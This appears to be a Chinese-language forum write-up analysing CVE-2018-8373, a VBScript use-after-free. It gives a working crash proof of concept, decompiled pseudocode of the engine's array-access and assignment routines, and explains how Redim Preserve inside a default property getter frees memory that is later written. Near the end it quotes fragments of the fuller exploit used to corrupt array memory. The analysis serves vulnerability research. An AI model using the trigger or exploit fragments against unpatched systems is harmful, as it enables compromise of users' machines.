
# [原创]CVE-2018-8373分析与复现

## 导致crash的exp

```
Class MyClass
Dim array()
Private Sub Class\_Initialize
Redim array(2)
End Sub
Public Default Property Get P
Redim Preserve array(1)
End Property
End Class
Set cls=New MyClass
cls.array(2)=cls
```

## 触发点分析

![](upload/attach/201907/609565\_WQ67K9UX4D66ZGC.png)

最后这行代码`cls.array(2)=cls`会调用`NameTbl::InvokeEx`。

逆向结果显示,`NameTbl::InvokeEx`接着会调用`AccessArray`和`AssignVar`,其中`stackFor_ecx`为导致栈分配接着写入的传递值=`ecx`也就是`AssignVar`的`edx`的寄存器,如图1

```
struct IEntryPoint \*\_\_stdcall NameTbl::InvokeEx(NameTbl \*this, int a2, unsigned int a3, int a4, struct tagDISPPARAMS \*a5, struct tagVARIANT \*a6, struct tagEXCEPINFO \*a7, struct IServiceProvider \*a8)
{
省略部分....
else if ( ((\_DWORD)v18->lpVtbl & 0xBFFF) == 8204 )
{
hr = (struct IEntryPoint \*)AccessArray(
(VAR \*)v18,
&stackFor\_ecx,
(struct VAR \*\*)(v30 - 1),
(struct VAR \*)(\*v29 + 16),
0,
v42,
v43);
if ( (signed int)v13 >= 0 )
//stackFor\_ecx也就是edx的寄存器
hr = (struct IEntryPoint \*)AssignVar(
(int)stackFor\_ecx,
v45,
(struct CSession \*)&pvarg,
v48,
v42,
(unsigned int)v43);
VarList::~VarList((VarList \*)&v54);
}
....
}
HRESULT \_\_userpurge AccessArray@<eax>(VAR \*varFrom@<edx>, \_DWORD \*stack@<ecx>, struct VAR \*\*checkVar, struct VAR \*varRef, int arrRetRef, struct VAR \*a6, struct tagSAFEARRAY \*\*a7)
{
struct VAR \*varPtrType; // eax
SAFEARRAY \*arrRet; // esi
struct VAR \*\*v9; // eax
VAR \*varNext; // ebx
int dataSizeOffset; // edi
struct VAR \*vatType; // eax
int varDimCount; // eax
int DimSize; // eax
int dataSize; // edi
HRESULT result; // eax
int v17; // ecx
int v18; // ecx
struct VAR \*v19; // [esp+0h] [ebp-34h]
const unsigned \_\_int16 \*v20; // [esp+4h] [ebp-30h]
int RetVal; // [esp+18h] [ebp-1Ch]
\_DWORD \*stackFor\_ecx; // [esp+28h] [ebp-Ch]
SAFEARRAYBOUND \*rgsaboundRef; // [esp+2Ch] [ebp-8h]
stackFor\_ecx = stack;
varPtrType = VAR::PvarCutAll(varFrom);
// 如果是Array类型
if ( \*(\_WORD \*)varPtrType == 8204 )
{
arrRet = (SAFEARRAY \*)\*((\_DWORD \*)varPtrType + 2);
}
else
{
if ( \*(\_WORD \*)varPtrType != 24588 )
return -2147352571;
arrRet = (SAFEARRAY \*)\*\*((\_DWORD \*\*)varPtrType + 2);
}
if ( !arrRet )
return -2147352565;
v9 = (struct VAR \*\*)arrRet->cDims;
if ( !(\_WORD)v9 || v9 != checkVar )
return -2147352565;
result = SafeArrayLock(arrRet);
if ( result >= 0 )
{
varNext = varRef;
// 获取第一个维度
rgsaboundRef = arrRet->rgsabound;
dataSizeOffset = 0;
while ( 1 )
{
vatType = VAR::PvarCutAll(varNext);
if ( \*(\_WORD \*)vatType == 2 )
{
// 短整形
varDimCount = \*((signed \_\_int16 \*)vatType + 4);
}
else if ( \*(\_WORD \*)vatType == 3 )
{
// 长整形
varDimCount = \*((\_DWORD \*)vatType + 2);
}
else
{
if ( rtVariantChangeTypeEx(
(struct tagVARIANT \*)0x400,
(struct tagVARIANT \*)2,
3u,
(unsigned \_\_int16)v19,
(unsigned \_\_int16)v20) < 0 )
{
SafeArrayUnlock(arrRet);
return CScriptRuntime::RecordHr(v18, v19, v20);
}
varDimCount = RetVal;
}
DimSize = varDimCount - rgsaboundRef->lLbound;
// 如果维度大小长度大于维度的元素个数
if ( DimSize < 0 || DimSize >= (signed int)rgsaboundRef->cElements )
{
SafeArrayUnlock(arrRet);
return CScriptRuntime::RecordHr(v17, v19, v20);
}
// 当前维度元素大小
dataSize = DimSize + dataSizeOffset;
checkVar = (struct VAR \*\*)((char \*)checkVar - 1);
if ( (signed int)checkVar <= 0 )
break;
++rgsaboundRef;
dataSizeOffset = rgsaboundRef->cElements \* dataSize;
varNext = (VAR \*)((char \*)varNext + 16);
}
result = SafeArrayUnlock(arrRet);
if ( result >= 0 )
{
// 这里datasize正好是0x10,stack是pvData区域的最后0x10空间
\*stackFor\_ecx = (char \*)arrRet->pvData + dataSize \* arrRet->cbElements;
if ( arrRetRef )
\*(\_DWORD \*)arrRetRef = arrRet;
result = 0;
}
}
return result;
}
```

关于UAF写入位置我的理解是`array()`默认的长度是1,也就是是占用`0x10`位置空间, 通过`NameTbl::InvokeEx->AccessArray->AssignVar`,因为默认长度是1,所以`AccessArray`的`stackFor_ecx`分配`0x10`之后后面的空间都是??? ,实际上仅仅是分配了`0x10`后面没有更多的空间后续分配,在`SafeArrayRedim`又将`array`的`pvData`长度变为`array(2)`的大小也就是3个元素`*0x10=0x30`,从地址空间的布局可以看出这个`0x30`空间最后`0x10`空间正好是`0ceaeff0`也就是`array()`默认的长度1个元素所占用的空间,由于`RedimPreserveArray`把这个空间给释放了,导致实际上释放后可重用的空间还是最初`AccessArray`申请的`array()`默认的长度1个元素所占用的空间,最后`cls.array(2)=cls`调用`AssignVar`也是往这个地址空间写入数据,因为申请的栈的位置还是`AccessArray`这里申请的`stackFor_ecx->edi`,导致崩溃,所以在8373后面的代码

```
Set cls = New MyClass
array(2)=cls
//之后导致执行
For i = 0 To UBound(array2,2)
array2(0,i) = 3
Next
```

这个`3`值首先往申请的栈写入

```
For i = 0 To UBound(array)
array(i) = array2
Next
```

这里只是`array`的`pvData`赋值成`array2`,仅仅是引用,`array2`的`pvData`在它直接`pvData`指针指向的地址所以为实际写入`array`的`pvData`

```
Public Default Property Get P
P=&h0fffffff
End Property
```

`MyClass`的`p`属性需要往栈写入值,通过`AssignVar`,所以导致`array()`默认的`0x10`空间在也就是`RedimPreserveArray`最后的`0x10`空间数据为`3` 和`0fffffff`
